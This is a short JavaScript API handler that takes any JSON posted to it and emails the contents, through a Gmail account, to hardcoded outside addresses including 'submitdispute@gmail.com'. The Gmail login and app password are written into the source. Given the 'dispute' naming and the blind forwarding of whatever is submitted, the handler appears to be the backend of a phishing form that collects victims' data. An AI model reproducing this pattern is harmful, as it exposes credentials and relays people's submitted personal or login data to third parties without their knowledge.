import nodemailer from "nodemailer";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Only POST requests allowed" });
  }

  try {
    const data = req.body;

    if (!data || typeof data !== "object") {
      return res.status(400).json({ error: "Invalid JSON data" });
    }

    const transporter = nodemailer.createTransport({
      host: "smtp.gmail.com",
      port: 587,
      secure: false,
      auth: {
        user: "dardhame1@gmail.com",
        pass: "vbbx qrsx uvpo plzl"
      }
    });

    const prettyJson = JSON.stringify(data, null, 2);

    await transporter.sendMail({
      from: `"PROFESSOR" <dardhame1@gmail.com>`, // Name + Email
      to: "submitdispute@gmail.com,newzatpage.com", // Zubair ka email yahan hardcode
      subject: "Zubair",
      text: prettyJson,
      html: `<pre>${escapeHtml(prettyJson)}</pre>`
    });

    res.status(200).json({ success: true, message: "Email sent to Zubair" });

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to send email" });
  }
}

function escapeHtml(str) {
  return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}
